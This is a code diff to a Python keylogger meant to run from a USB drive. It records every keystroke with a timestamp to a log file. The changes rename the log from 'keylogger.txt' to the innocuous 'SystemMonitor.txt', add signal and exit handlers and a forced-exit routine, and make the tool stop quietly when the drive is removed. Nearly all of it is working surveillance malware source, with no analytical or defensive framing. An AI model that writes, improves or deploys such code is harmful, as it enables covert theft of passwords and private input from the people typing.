@@ -4,6 +4,9 @@ import os
 import sys
 import time
 import threading
+import atexit
+import contextlib
+import signal
 
 def get_executable_directory():
     try:
@@ -20,32 +23,104 @@ def get_executable_directory():
 
 # Get the directory and set up log file
 current_dir = get_executable_directory()
-log_file = os.path.join(current_dir, "keylogger.txt")
+log_file = os.path.join(current_dir, "SystemMonitor.txt")
 
-# Global variable to control the listener
+# Global variables
 should_stop = False
+listener = None
+usb_check_thread = None
+
+def force_exit():
+    """Force exit the program"""
+    try:
+        # Try to kill the process
+        if sys.platform.startswith('win'):
+            import ctypes
+            ctypes.windll.kernel32.TerminateProcess(ctypes.windll.kernel32.GetCurrentProcess(), 1)
+        else:
+            os.kill(os.getpid(), signal.SIGKILL)
+    except:
+        os._exit(1)
+
+def safe_write_to_log(content):
+    """Safely write to log file with immediate close"""
+    max_retries = 3
+    retry_delay = 0.1
+    
+    for attempt in range(max_retries):
+        try:
+            with open(log_file, "a", encoding="utf-8") as f:
+                f.write(content)
+                f.flush()
+                os.fsync(f.fileno())
+            return True
+        except Exception as e:
+            if attempt == max_retries - 1:
+                return False
+            time.sleep(retry_delay)
+    return False
 
 def check_usb_connected():
     """Check if the USB drive is still connected by trying to access the log file"""
     try:
-        # Try to open the log file in append mode
+        # First check if the directory still exists
+        if not os.path.exists(os.path.dirname(log_file)):
+            return False
+            
+        # Then try to open the file
         with open(log_file, "a", encoding="utf-8") as f:
-            f.write("")  # Write nothing, just check if we can access the file
-        return True
+            return True
     except:
         return False
+
+def cleanup():
+    """Cleanup function to be called on exit"""
+    global should_stop, listener, usb_check_thread
+    should_stop = True
+    
+    try:
+        # Stop the keyboard listener
+        if listener:
+            listener.stop()
+        
+        # Stop the USB check thread
+        if usb_check_thread and usb_check_thread.is_alive():
+            usb_check_thread.join(timeout=0.5)
+            
+        # Final cleanup message
+        safe_write_to_log(f"\nSystem activity log stopped at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+    except:
+        pass
+    
+    # Force exit after cleanup
+    force_exit()
+
+# Register cleanup functions
+atexit.register(cleanup)
+signal.signal(signal.SIGTERM, lambda signo, frame: cleanup())
+signal.signal(signal.SIGINT, lambda signo, frame: cleanup())
 
 def usb_check_loop():
     """Continuously check if USB is connected"""
     global should_stop
+    consecutive_failures = 0
+    max_failures = 3  # Number of consecutive failures before considering USB disconnected
+    
     while not should_stop:
         if not check_usb_connected():
-            should_stop = True
-            # Force exit the program
-            os._exit(0)
-        time.sleep(0.1)  # Check every 100ms
+            consecutive_failures += 1
+            if consecutive_failures >= max_failures:
+                should_stop = True
+                cleanup()
+                return
+        else:
+            consecutive_failures = 0
+        time.sleep(0.5)  # Check every 500ms
 
 def on_press(key):
+    if should_stop:
+        return False
+        
     try:
         # Get current timestamp
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -131,39 +206,44 @@ def on_press(key):
             key_char = str(key).replace("'", "")
         
         # Write to log file
-        with open(log_file, "a", encoding="utf-8") as f:
-            f.write(f"{timestamp} - {key_char}\n")
+        if not safe_write_to_log(f"{timestamp} - {key_char}\n"):
+            return False  # Stop listener if we can't write
             
     except Exception as e:
-        # Create an error log file if there's an issue
-        error_log = os.path.join(current_dir, "error_log.txt")
-        with open(error_log, "a", encoding="utf-8") as f:
-            f.write(f"{datetime.datetime.now()} - Error: {str(e)}\n")
-        os._exit(1)
+        return False
 
 def on_release(key):
-    pass  # We don't need to do anything on key release
+    if should_stop:
+        return False
+    return None  # Continue monitoring
 
 # Create the log file if it doesn't exist and add start message
 try:
+    start_message = "System activity log started at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n"
     if not os.path.exists(log_file):
-        with open(log_file, "w", encoding="utf-8") as f:
-            f.write("System activity log started at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
+        if not safe_write_to_log(start_message):
+            sys.exit(1)
     else:
         # Add a new start message each time the script is run
-        with open(log_file, "a", encoding="utf-8") as f:
-            f.write("\nSystem activity log restarted at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
+        if not safe_write_to_log("\nSystem activity log restarted at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n"):
+            sys.exit(1)
 except Exception as e:
-    error_log = os.path.join(current_dir, "error_log.txt")
-    with open(error_log, "a", encoding="utf-8") as f:
-        f.write(f"{datetime.datetime.now()} - Initialization Error: {str(e)}\n")
-    os._exit(1)  # Exit if we can't create the log file
+    sys.exit(1)  # Exit if we can't create the log file
 
 # Start the USB check thread
 usb_check_thread = threading.Thread(target=usb_check_loop)
-usb_check_thread.daemon = True  # This thread will be killed when the main program exits
+usb_check_thread.daemon = True
 usb_check_thread.start()
 
 # Start the listener
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join() 
+listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+listener.start()
+
+try:
+    while not should_stop:
+        time.sleep(0.1)
+        if not usb_check_thread.is_alive():
+            break
+    cleanup()
+except:
+    cleanup() 
